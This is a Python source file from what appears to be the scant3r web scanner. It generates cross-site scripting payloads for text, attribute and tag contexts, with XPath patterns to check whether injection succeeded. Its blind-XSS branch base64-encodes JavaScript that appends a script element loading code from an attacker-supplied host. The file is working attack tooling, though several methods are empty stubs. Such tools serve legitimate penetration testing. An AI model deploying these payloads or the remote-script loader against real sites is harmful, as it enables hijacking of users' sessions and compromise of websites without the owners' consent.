from base64 import b64encode
from typing import List, Optional, Tuple, Union

from scant3r.core.data import XSS_JS_FUNC, XSS_JS_VALUE, XSS_TAGS, XSS_ATTR
from scant3r.core.utils import random_str

from scant3r.core.htmlparser import HTMLForXpath, HTMLMatch


class XSS_PAYLOADS:
    def __init__(
        self,
        xss_payloads: List[str],
        blind_payloads: List[str],
        host: Union[str, None] = None,
    ):
        self.payloads = xss_payloads
        self.blind_payloads = blind_payloads
        self.blind = []
        if host is not None:
            b64_jsvalue = (
                b64encode(
                    f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode(
                        "utf-8"
                    )
                )
                .decode("utf-8")
                .replace("=", "")
            )
            for blind_payload in self.blind_payloads:
                new_payload = blind_payload.replace("{host}", host).replace(
                    "{b64_host}", b64_jsvalue
                )
                self.payloads.append(new_payload)

    def attrname(self, payload: str) -> List[Tuple[str, str]]:
        payloads = []
        return payloads

    def attrvalue(self, payload: str) -> List[str]:
        pass

    def comment(self, payload: str) -> List[str]:
        pass

    def tagname(self) -> List[Tuple[str, str]]:
        payloads = []
        for ATTR in XSS_ATTR:
            for JS_CMD in XSS_JS_VALUE:
                for JS_FUNC in XSS_JS_FUNC:
                    for space in range(1, 5):
                        new_payload = "{random_txt}{space} {attr}={js_func}({js_cmd}){space}".format(
                            random_txt=random_str(1),
                            space="".center(space),
                            attr=ATTR,
                            js_func=JS_FUNC,
                            js_cmd=JS_CMD,
                        )
                        search_pattern = '//*[@{attr}="{js_func}({js_cmd})"]'.format(
                            attr=ATTR,
                            js_func=JS_FUNC,
                            js_cmd=JS_CMD,
                        )
                        payloads.append((new_payload, search_pattern))

                        new_payload = "{random_txt}{space} {attr}={js_func}`{js_cmd}`{space}".format(
                            random_txt=random_str(1),
                            space="".center(space),
                            attr=ATTR,
                            js_func=JS_FUNC,
                            js_cmd=JS_CMD,
                        )
                        search_pattern = '//*[@{attr}="{js_func}`{js_cmd}`"]'.format(
                            attr=ATTR,
                            js_func=JS_FUNC,
                            js_cmd=JS_CMD,
                        )
                        payloads.append((new_payload, search_pattern))
        return payloads

    def endtag(self, payload: str) -> List[str]:
        pass

    def txt(self, before_payload: str) -> List[Tuple[str, str]]:
        payloads = []
        for TAG in XSS_TAGS:
            if "$JS_FUNC$" not in TAG and "$JS_CMD$" not in TAG:
                xpath = HTMLForXpath()
                payload = f"{before_payload}{TAG}"
                xpath.feed(payload)
                payloads.append((payload, xpath.data))
            else:
                for JS_FUNC in XSS_JS_FUNC:
                    for JS_CMD in XSS_JS_VALUE:
                        xpath = HTMLForXpath()
                        NEW_TAG = TAG.replace("$JS_CMD$", JS_CMD).replace(
                            "$JS_FUNC$", JS_FUNC
                        )
                        payload = f"{before_payload}{NEW_TAG}"
                        xpath.feed(payload)
                        payloads.append((payload, xpath.data))
        return payloads

    def generate(
        self, payload: str, location: Optional[str] = "text"
    ) -> List[Tuple[str, str]]:
        match location:
            case HTMLMatch.Text:
                return self.txt(payload)
            case HTMLMatch.AttrName:
                return self.attrname(payload)
            case HTMLMatch.TAG_NAME:
                return self.tagname()
            case _:
                return []
